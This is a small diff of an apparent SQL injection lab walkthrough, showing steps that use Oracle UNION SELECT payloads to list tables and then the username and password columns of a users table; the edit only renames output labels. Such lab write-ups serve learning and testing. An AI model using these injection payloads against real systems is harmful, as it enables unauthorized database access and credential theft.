@@ -31,13 +31,13 @@ Step - 5
 --------
 ' UNION SELECT 'a',table_name FROM all_tables--
 -----------------------------------------------
-Table: USERS_JASUOU
+Table Name: USERS_JASUOU
 
 Step - 6
 --------
 ' UNION SELECT 'a',column_name FROM all_tab_columns WHERE table_name='USERS_JASUOU'--
 -------------------------------------------------------------------------------------
-Column: USERNAME_GSFFNH and PASSWORD_DITWXL
+Column Name: USERNAME_GSFFNH and PASSWORD_DITWXL
 
 Step - 7
 --------
